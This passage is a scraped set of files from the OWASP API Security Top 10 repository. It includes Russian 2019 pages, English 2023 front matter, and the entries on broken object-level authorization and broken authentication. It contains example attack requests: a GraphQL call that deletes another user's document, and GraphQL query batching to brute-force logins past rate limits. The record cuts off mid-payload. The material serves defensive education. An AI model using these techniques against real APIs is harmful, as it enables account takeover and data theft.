https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:47.274780"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xb1-next-devsecops.md", "content": "# Дальнейшие шаги для DevSecOps\n\nСоздание безопасных API критически важно из-за их роли в архитектуре современных приложений. Безопасностью нельзя пренебрегать, она должна быть частью всего жизненного цикла разработки. Уже недостаточно проводить сканирование и тестирование на проникновение раз в год.\n\nDevSecOps должны присоединиться к работе по разработке и обеспечить непрерывное тестирование безопасности на всем жизненном цикле разработки ПО. Их цель - усовершенствовать процесс разработки, автоматизировав проверки безопасности, не влияя на скорость разработки.\n\nЕсли вы сомневаетесь, ознакомьтесь с [DevSecOps Manifesto][1] и следите за его обновлениями.\n\n| | |\n|-|-|\n| **Понимание модели угроз** | Приоритеты при тестировании исходят из модели угроз. Если у вас ее нет, рассмотрите использование [OWASP Application Security Verification Standard (ASVS)][2] и [OWASP Testing Guide][3] для начала ее составления. Включение команды разработки может помочь им быть более осведомленными в сфере безопасности. |\n| **Понимание жизненного цикла разработки ПО** | Объединитесь с командой разработки для лучшего понимания жизненного цикла разработки ПО. Ваше содействие в части непрерывного тестирования безопасности должно гармонировать с людьми, процессами и инструментами. Все должны быть согласны с процессом для предотвращения ненужных разногласий и сопротивления. |\n| **Стратегии тестирования** | Поскольку ваша работа не должна влиять на скорость разработки, вам необходимо продуманно выбрать наилучшие (простые, быстрые и наиболее точные) подходы к проверке требований по безопасности. [OWASP Security Knowledge Framework][4] и [OWASP Application Security Verification Standard][5] - отличные источники функциональных и нефункциональных требований по безопасности. Существуют также другие отличные [проекты][6] и [инструменты][7], аналогичные предлагаемым [сообществом DevSecOps][8]. |\n| **Достижение покрытия и точности** | Вы соединяете команды разработки и эксплуатации. Чтобы достичь покрытия нужно сфокусироваться не только на функциональности, но и на оркестрации. Работайте совместно с командами разработки и эксплуатации с самого начала, чтобы оптимизировать свои трудозатраты. Вы должны стремиться к состоянию, когда основы безопасности непрерывно проверяются. |\n| **Четко описывайте найденные уязвимости** | Приносите пользу, избегая конфликтов. Передавайте команде разработки информацию о найденных уязвимостях своевременно, с помощью инструментов, используемых командой разработки. Помогите команде разработки разобрать найденные уязвимости. Постарайтесь обучить их, четко объяснив выявленные недостатки и процесс их эксплуатации, включая реальный сценарий атаки. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:47.391813"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xd0-about-data.md", "content": "# Методология и данные\n\n## Обзор\n\nПоскольку индустрия AppSec не сфокусирована главным образом на новейшей архитектуре приложений, в которой API играют важную роль, составление списка из десяти наиболее критичных рисков безопасности API на базе публичного сбора данных - сложная задача. Несмотря на отсутствие публичного сбора данных, получившийся список все равно основан на общедоступной информации, вкладе экспертов по безопасности и открытых дискуссиях сообщества по безопасности.\n\n## Методология\n\nНа первом этапе группа экспертов по безопасности собрала, проанализировала и категоризировала публичные данные об инцидентах безопасности в API. Эти данные были собраны с площадок bug bounty площадок и баз данных уязвимостей за последний год. Этот временной промежуток выбран для удобства расчета статистики.\n\nЗатем эксперты по безопасности с опытом тестирования на проникновение составили свой список 10-ти наиболее критичных рисков.\n\n[Методология ранжирования рисков OWASP][1] была использована в ходе анализа рисков. Эксперты по безопасности проанализировали результаты. Чтобы узнать о рассуждениях на эту тему обратитесь к секции [Риски безопасности API][2].\n\nПервый черновик OWASP API Security Top 10 2019 был составлен на базе статистических результатов первого этапа и списков, созданных экспертами по безопасности. Этот черновик был отправлен для проверки и анализа другой группе экспертов по безопасности с достаточным опытом в сфере безопасности API.\n\nOWASP API Security Top 10 2019 впервые был представлен на конференции OWASP Global AppSec Tel Aviv в мае 2019 года. С тех пор он доступен на GitHub для публичного обсуждения и содействия.\n\nСписок участников, внесших свой вклад, доступен в секции [Благодарность][3].\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:47.508468"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xd1-acknowledgments.md", "content": "# Благодарность\n\n## Благодарность участникам\n\nМы хотели бы поблагодарить всех участников, кто публично участвовал в проекте на GitHub или другими способами:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:47.627074"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x00-header.md", "content": "---\ntitle: ''\ndescription: OWASP API Security Top 10 2023 edition\n---\n\n![OWASP LOGO](images/cover.jpg)\n\n| | | |\n| - | - | - |\n| https://owasp.org | This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n\n", "timestamp": "2025-10-24T22:26:48.608449"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x00-notice.md", "content": "# Notice\n\nThis is the text version of OWASP API Security Top 10, used as source for any\nofficial versions of this document such the web site.\n\nContributions to the project such as comments, corrections, or translations\nshould be done here. For details on [How To Contribute][1], please refer to\n[CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n* Paulo Silva\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:48.726076"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x00-toc.md", "content": "# Table of Contents\n\n* [Table of Contents](0x00-toc.md)\n* [About OWASP](0x01-about-owasp.md)\n* [Foreword](0x02-foreword.md)\n* [Introduction](0x03-introduction.md)\n* [Release Notes](0x04-release-notes.md)\n* [API Security Risks](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2023](0x11-t10.md)\n* [API1:2023 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2023 Broken Authentication](0xa2-broken-authentication.md)\n* [API3:2023 Broken Object Property Level Authorization](0xa3-broken-object-property-level-authorization.md)\n* [API4:2023 Unrestricted Resource Consumption](0xa4-unrestricted-resource-consumption.md)\n* [API5:2023 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2023 Unrestricted Access to Sensitive Business Flows](0xa6-unrestricted-access-to-sensitive-business-flows.md)\n* [API7:2023 Server Side Request Forgery](0xa7-server-side-request-forgery.md)\n* [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)\n* [API9:2023 Improper Inventory Management](0xa9-improper-inventory-management.md)\n* [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)\n* [What's Next For Developers](0xb0-next-devs.md)\n* [What's Next For DevSecOps](0xb1-next-devsecops.md)\n* [Methodology and Data](0xd0-about-data.md)\n* [Acknowledgments](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:48.842623"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x01-about-owasp.md", "content": "# About OWASP\n\nThe Open Worldwide Application Security Project (OWASP) is an open community\ndedicated to enabling organizations to develop, purchase, and maintain\napplications and APIs that can be trusted.\n\nAt OWASP, you'll find free and open:\n\n* Application security tools and standards.\n* Complete books on application security testing, secure code development, and\n  secure code review.\n* Presentations and [videos][1].\n* [Cheat sheets][2] on many common topics.\n* Standard security controls and libraries.\n* [Local chapters worldwide][3].\n* Cutting edge research.\n* Extensive [conferences worldwide][4].\n* [Mailing lists][5] ([archive][6]).\n\nLearn more at: [https://www.owasp.org][7].\n\nAll OWASP tools, documents, videos, presentations, and chapters are free and\nopen to anyone interested in improving application security.\n\nWe advocate approaching application security as a people, process, and\ntechnology problem, because the most effective approaches to application\nsecurity require improvements in these areas.\n\nOWASP is a new kind of organization. Our freedom from commercial pressures\nallows us to provide unbiased, practical, and cost-effective information about\napplication security.\n\nOWASP is not affiliated with any technology company, although we support the\ninformed use of commercial security technology. OWASP produces many types of\nmaterials in a collaborative, transparent, and open way.\n\nThe OWASP Foundation is the non-profit entity that ensures the project's\nlong-term success. Almost everyone associated with OWASP is a volunteer,\nincluding the OWASP board, chapter leaders, project leaders, and project\nmembers. We support innovative security research with grants and infrastructure.\n\nCome join us!\n\n## Copyright and License\n\n![license](images/license.png)\n\nCopyright © 2003-2023 The OWASP Foundation. This document is released under the\n[Creative Commons Attribution Share-Alike 4.0 license][8]. For any reuse or\ndistribution, you must make it clear to others the license terms of this work.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://cheatsheetseries.owasp.org/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://groups.google.com/a/owasp.org/forum/#!overview\n[6]: https://lists.owasp.org/mailman/listinfo\n[7]: https://www.owasp.org\n[8]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:48.961764"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x02-foreword.md", "content": "# Foreword\n\nA foundational element of innovation in today's app-driven world is the\nApplication Programming Interface (API). From banks, retail, and transportation\nto IoT, autonomous vehicles, and smart cities, APIs are a critical part of\nmodern mobile, SaaS, and web applications and can be found in customer-facing,\npartner-facing, and internal applications.\n\nBy nature, APIs expose application logic and sensitive data such as Personally\nIdentifiable Information (PII) and because of this, APIs have increasingly\nbecome a target for attackers. Without secure APIs, rapid innovation would be\nimpossible.\n\nAlthough a broader web application security risks Top 10 still makes sense, due\nto their particular nature, an API-specific security risks list is required.\nAPI security focuses on strategies and solutions to understand and mitigate the\nunique vulnerabilities and security risks associated with APIs.\n\nIf you're familiar with the [OWASP Top 10 Project][1], then you'll notice the\nsimilarities between both documents: they are intended for readability and\nadoption. If you're new to the OWASP Top 10 series, you may be better off\nreading the [API Security Risks][2] and [Methodology and Data][3] sections\nbefore jumping into the Top 10 list.\n\nYou can contribute to OWASP API Security Top 10 with your questions, comments,\nand ideas at our GitHub project repository:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nYou can find the OWASP API Security Top 10 here:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security\n\nWe wish to thank all the contributors who made this project possible with their\neffort and contributions. They are all listed in the [Acknowledgments\nsection][4]. Thank you!\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:49.202633"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x03-introduction.md", "content": "# Introduction\n\n## Welcome to the OWASP API Security Top 10 - 2023!\n\nWelcome to the second edition of the OWASP API Security Top 10!\n\nThis awareness document was first published back in 2019. Since then, the API\nSecurity industry has flourished and become more mature. We strongly believe\nthis work has positively contributed to it, due to it being quickly adopted as\nan industry reference.\n\nAPIs play a very important role in modern application architecture. But since\ninnovation has a different pace than creating security awareness, we believe\nit's important to focus on creating awareness for common API security\nweaknesses.\n\nThe primary goal of the OWASP API Security Top 10 is to educate those involved\nin API development and maintenance, for example, developers, designers,\narchitects, managers, or organizations. You can know more about the API Security\nProject visiting [the project page][1].\n\nIf you're not familiar with the OWASP top 10 series, we recommend checking at\nleast the following top 10 projects:\n\n* [OWASP Cloud-Native Application Security Top 10][2]\n* [OWASP Desktop App Security Top 10][3]\n* [OWASP Docker Top 10][4]\n* [OWASP Low-Code/No-Code Top 10][5]\n* [OWASP Machine Learning Security Top Ten][6]\n* [OWASP Mobile Top 10][7]\n* [OWASP TOP 10][8]\n* [OWASP Top 10 CI/CD Security Risks][9]\n* [OWASP Top 10 Client-Side Security Risks][10]\n* [OWASP Top 10 Privacy Risks][11]\n* [OWASP Serverless Top 10][12]\n\nNone of the projects replaces another: if you're working on a mobile application\npowered by a back-end API, you're better off reading both the corresponding top\n10's. The same is valid if you're working on a web or desktop application\npowered by APIs.\n\nIn the [Methodology and Data][13] section, you can read more about how this\nedition was created. For now, we encourage everyone to contribute with\nquestions, comments, and ideas at our [GitHub repository][14] or\n[Mailing list][15].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: https://owasp.org/www-project-cloud-native-application-security-top-10/\n[3]: https://owasp.org/www-project-desktop-app-security-top-10/\n[4]: https://owasp.org/www-project-docker-top-10/\n[5]: https://owasp.org/www-project-top-10-low-code-no-code-security-risks/\n[6]: https://owasp.org/www-project-machine-learning-security-top-10/\n[7]: https://owasp.org/www-project-mobile-top-10/\n[8]: https://owasp.org/www-project-top-ten/\n[9]: https://owasp.org/www-project-top-10-ci-cd-security-risks/\n[10]: https://owasp.org/www-project-top-10-client-side-security-risks/\n[11]: https://owasp.org/www-project-top-10-privacy-risks/\n[12]: https://owasp.org/www-project-serverless-top-10/\n[13]: ./0xd0-about-data.md\n[14]: https://github.com/OWASP/API-Security\n[15]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:49.315772"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x04-release-notes.md", "content": "# Release Notes\n\nThis is the second edition of the OWASP API Security Top 10 edition, exactly\nfour years after its first release. A lot has changed in the API (security)\nscene. API traffic increased at a fast pace, some API protocols gained a lot\nmore traction, many new API security vendors/solutions have popped up, and, of\ncourse, attackers have developed new skills and techniques to compromise\nAPIs. It was about time to get the list of the ten most critical API security\nrisks updated.\n\nWith a more mature API security industry, for the first time, there was [a\npublic call for data][1]. Unfortunately, no data was contributed, but based on\nthe project's team experience, careful API security specialist review, and\ncommunity feedback on the release candidate, we built this new list. In the\n[Methodology and Data section][2], you'll find more details about how this\nversion was built. For more details about the security risks please refer to the\n[API Security Risks section][3].\n\nThe OWASP API Security Top 10 2023 is a forward-looking awareness document for\na fast pace industry. It does not replace other TOP 10's. In this edition:\n\n* We've combined Excessive Data Exposure and Mass Assignment focusing on the\n  common root cause: object property level authorization validation failures.\n* We've put more emphasis on resource consumption, over focusing on the pace\n  they are exhausted.\n* We've created a new category \"Unrestricted Access to Sensitive Business Flows\"\n  to address new threats, including most of those that can be mitigated using\n  rate limiting.\n* We added \"Unsafe Consumption of APIs\" to address something we've started\n  seeing: attackers have started looking for a target's integrated services to\n  compromise those, instead of hitting the APIs of their target directly. This\n  is the right time to start creating awareness about this increasing risk.\n\nAPIs play an increasingly important role in modern microservices architecture,\nSingle Page Applications (SPAs), mobile apps, IoT, etc. The OWASP API Security\nTop 10 is a required effort to create awareness about modern API security\nissues.\n\nThis update was only possible due to the great effort of several volunteers,\nlisted in the [Acknowledgments][4] section.\n\nThank you!\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: ./0xd0-about-data.md\n[3]: ./0x10-api-security-risks.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:49.435701"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x10-api-security-risks.md", "content": "# API Security Risks\n\nThe [OWASP Risk Rating Methodology][1] was used to do the risk analysis.\n\nThe table below summarizes the terminology associated with the risk score.\n\n| Threat Agents | Exploitability | Weakness Prevalence | Weakness Detectability | Technical Impact | Business Impacts |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| API Specific | Easy: **3** | Widespread **3** | Easy **3** | Severe **3** | Business Specific |\n| API Specific | Average: **2** | Common **2** | Average **2** | Moderate **2** | Business Specific |\n| API Specific | Difficult: **1** | Difficult **1** | Difficult **1** | Minor **1** | Business Specific |\n\n**Note**: This approach does not take the likelihood of the threat agent into\naccount. Nor does it account for any of the various technical details associated\nwith your particular application. Any of these factors could significantly\naffect the overall likelihood of an attacker finding and exploiting a particular\nvulnerability. This rating does not take into account the actual impact on your\nbusiness. Your organization will have to decide how much security risk from\napplications and APIs the organization is willing to accept given your culture,\nindustry, and regulatory environment. The purpose of the OWASP API Security Top\n10 is not to do this risk analysis for you. Since this edition is not\ndata-driven, prevalence results from a consensus among the team members.\n\n## References\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### External\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:49.543513"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2023\n\n| Risk | Description |\n| ---- | ----------- |\n| [API1:2023 - Broken Object Level Authorization][api1] | APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface of Object Level Access Control issues. Object level authorization checks should be considered in every function that accesses a data source using an ID from the user. |\n| [API2:2023 - Broken Authentication][api2] | Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws to assume other user's identities temporarily or permanently. Compromising a system's ability to identify the client/user, compromises API security overall. |\n| [API3:2023 - Broken Object Property Level Authorization][api3] | This category combines [API3:2019 Excessive Data Exposure][1] and [API6:2019 - Mass Assignment][2], focusing on the root cause: the lack of or improper authorization validation at the object property level. This leads to information exposure or manipulation by unauthorized parties. |\n| [API4:2023 - Unrestricted Resource Consumption][api4] | Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Other resources such as emails/SMS/phone calls or biometrics validation are made available by service providers via API integrations, and paid for per request. Successful attacks can lead to Denial of Service or an increase of operational costs. |\n| [API5:2023 - Broken Function Level Authorization][api5] | Complex access control policies with different hierarchies, groups, and roles, and an unclear separation between administrative and regular functions, tend to lead to authorization flaws. By exploiting these issues, attackers can gain access to other users’ resources and/or administrative functions. |\n| [API6:2023 - Unrestricted Access to Sensitive Business Flows][api6] | APIs vulnerable to this risk expose a business flow - such as buying a ticket, or posting a comment - without compensating for how the functionality could harm the business if used excessively in an automated manner. This doesn't necessarily come from implementation bugs. |\n| [API7:2023 - Server Side Request Forgery][api7] | Server-Side Request Forgery (SSRF) flaws can occur when an API is fetching a remote resource without validating the user-supplied URI. This enables an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall or a VPN. |\n| [API8:2023 - Security Misconfiguration][api8] | APIs and the systems supporting them typically contain complex configurations, meant to make the APIs more customizable. Software and DevOps engineers can miss these configurations, or don't follow security best practices when it comes to configuration, opening the door for different types of attacks.  |\n| [API9:2023 - Improper Inventory Management][api9] | APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important. A proper inventory of hosts and deployed API versions also are important to mitigate issues such as deprecated API versions and exposed debug endpoints. |\n| [API10:2023 - Unsafe Consumption of APIs][api10] | Developers tend to trust data received from third-party APIs more than user input, and so tend to adopt weaker security standards. In order to compromise APIs, attackers go after integrated third-party services instead of trying to compromise the target API directly. |\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/\n[api1]: 0xa1-broken-object-level-authorization.md\n[api2]: 0xa2-broken-authentication.md\n[api3]: 0xa3-broken-object-property-level-authorization.md\n[api4]: 0xa4-unrestricted-resource-consumption.md\n[api5]: 0xa5-broken-function-level-authorization.md\n[api6]: 0xa6-unrestricted-access-to-sensitive-business-flows.md\n[api7]: 0xa7-server-side-request-forgery.md\n[api8]: 0xa8-security-misconfiguration.md\n[api9]: 0xa9-improper-inventory-management.md\n[api10]: 0xaa-unsafe-consumption-of-apis.md\n", "timestamp": "2025-10-24T22:26:49.650458"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa1-broken-object-level-authorization.md", "content": "# API1:2023 Broken Object Level Authorization\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Moderate** : Business Specific |\n| Attackers can exploit API endpoints that are vulnerable to broken object-level authorization by manipulating the ID of an object that is sent within the request. Object IDs can be anything from sequential integers, UUIDs, or generic strings. Regardless of the data type, they are easy to identify in the request target (path or query string parameters), request headers, or even as part of the request payload. | This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access. The server response is usually enough to understand whether the request was successful. | Unauthorized access to other users’ objects can result in data disclosure to unauthorized parties, data loss, or data manipulation. Under certain circumstances, unauthorized access to objects can also lead to full account takeover. |\n\n## Is the API Vulnerable?\n\nObject level authorization is an access control mechanism that is usually\nimplemented at the code level to validate that a user can only access the\nobjects that they should have permissions to access.\n\nEvery API endpoint that receives an ID of an object, and performs any action\non the object, should implement object-level authorization checks. The checks\nshould validate that the logged-in user has permissions to perform the\nrequested action on the requested object.\n\nFailures in this mechanism typically lead to unauthorized information\ndisclosure, modification, or destruction of all data.\n\nComparing the user ID of the current session (e.g. by extracting it from the\nJWT token) with the vulnerable ID parameter isn't a sufficient solution to\nsolve Broken Object Level Authorization (BOLA). This approach could address\nonly a small subset of cases.\n\nIn the case of BOLA, it's by design that the user will have access to the\nvulnerable API endpoint/function. The violation happens at the object level,\nby manipulating the ID. If an attacker manages to access an API\nendpoint/function they should not have access to - this is a case of [Broken\nFunction Level Authorization][5] (BFLA) rather than BOLA.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn e-commerce platform for online stores (shops) provides a listing page with\nthe revenue charts for their hosted shops. Inspecting the browser requests, an\nattacker can identify the API endpoints used as a data source for those charts\nand their pattern: `/shops/{shopName}/revenue_data.json`. Using another API\nendpoint, the attacker can get the list of all hosted shop names. With a\nsimple script to manipulate the names in the list, replacing `{shopName}` in\nthe URL, the attacker gains access to the sales data of thousands of e-commerce\nstores.\n\n### Scenario #2\n\nAn automobile manufacturer has enabled remote control of its vehicles via a\nmobile API for communication with the driver's mobile phone. The API enables\nthe driver to remotely start and stop the engine and lock and unlock the doors.\nAs part of this flow, the user sends the Vehicle Identification Number (VIN) to\nthe API.\nThe API fails to validate that the VIN represents a vehicle that belongs to the\nlogged in user, which leads to a BOLA vulnerability. An attacker can access\nvehicles that don't belong to him.\n\n### Scenario #3\n\nAn online document storage service allows users to view, edit, store and delete\ntheir documents. When a user's document is deleted, a GraphQL mutation with the\ndocument ID is sent to the API.\n\n```\nPOST /graphql\n{\n  \"operationName\":\"deleteReports\",\n  \"variables\":{\n    \"reportKeys\":[\"<DOCUMENT_ID>\"]\n  },\n  \"query\":\"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {\n    {\n      deleteReports(reportKeys: $reportKeys)\n    }\n  }\"\n}\n```\n\nSince the document with the given ID is deleted without any further permission\nchecks, a user may be able to delete another user's document.\n\n## How To Prevent\n\n* Implement a proper authorization mechanism that relies on the user policies\n  and hierarchy.\n* Use the authorization mechanism to check if the logged-in user has access to\n  perform the requested action on the record in every function that uses an\n  input from the client to access a record in the database.\n* Prefer the use of random and unpredictable values as GUIDs for records' IDs.\n* Write tests to evaluate the vulnerability of the authorization mechanism. Do\n  not deploy changes that make the tests fail.\n\n## References\n\n### OWASP\n\n* [Authorization Cheat Sheet][1]\n* [Authorization Testing Automation Cheat Sheet][2]\n\n### External\n\n* [CWE-285: Improper Authorization][3]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][4]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/285.html\n[4]: https://cwe.mitre.org/data/definitions/639.html\n[5]: ./0xa5-broken-function-level-authorization.md\n", "timestamp": "2025-10-24T22:26:49.764038"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa2-broken-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md", "content": "# API2:2023 Broken Authentication\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Severe** : Business Specific |\n| The authentication mechanism is an easy target for attackers since it's exposed to everyone. Although more advanced technical skills may be required to exploit some authentication issues, exploitation tools are generally available. | Software and security engineers’ misconceptions regarding authentication boundaries and inherent implementation complexity make authentication issues prevalent. Methodologies of detecting broken authentication are available and easy to create. | Attackers can gain complete control of other users’ accounts in the system, read their personal data, and perform sensitive actions on their behalf. Systems are unlikely to be able to distinguish attackers’ actions from legitimate user ones. |\n\n## Is the API Vulnerable?\n\nAuthentication endpoints and flows are assets that need to be protected.\nAdditionally, \"Forgot password / reset password\" should be treated the same way\nas authentication mechanisms.\n\nAn API is vulnerable if it:\n\n* Permits credential stuffing where the attacker uses brute force with a list\n  of valid usernames and passwords.\n* Permits attackers to perform a brute force attack on the same user account,\n  without presenting captcha/account lockout mechanism.\n* Permits weak passwords.\n* Sends sensitive authentication details, such as auth tokens and passwords in\n  the URL.\n* Allows users to change their email address, current password, or do any other\n  sensitive operations without asking for password confirmation.\n* Doesn't validate the authenticity of tokens.\n* Accepts unsigned/weakly signed JWT tokens (`{\"alg\":\"none\"}`)\n* Doesn't validate the JWT expiration date.\n* Uses plain text, non-encrypted, or weakly hashed passwords.\n* Uses weak encryption keys.\n\nOn top of that, a microservice is vulnerable if:\n\n* Other microservices can access it without authentication\n* Uses weak or predictable tokens to enforce authentication\n\n## Example Attack Scenarios\n\n## Scenario #1\n\nIn order to perform user authentication the client has to issue an API request\nlike the one below with the user credentials:\n\n```\nPOST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\\\"<username>\\\",password:\\\"<password>\\\") {\n      token\n    }\n   }\"\n}\n```\n\nIf credentials are valid, then an auth token is returned which should be\nprovided in subsequent requests to identify the user. Login attempts are\nsubject to restrictive rate limiting: only three requests are allowed per\nminute.\n\nTo brute force log in with a victim's account, bad actors leverage GraphQL\nquery batching to bypass the request rate limiting, speeding up the attack:\n\n```\nPOST /graphql\n[\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"password\\\"){token}}\"},\n  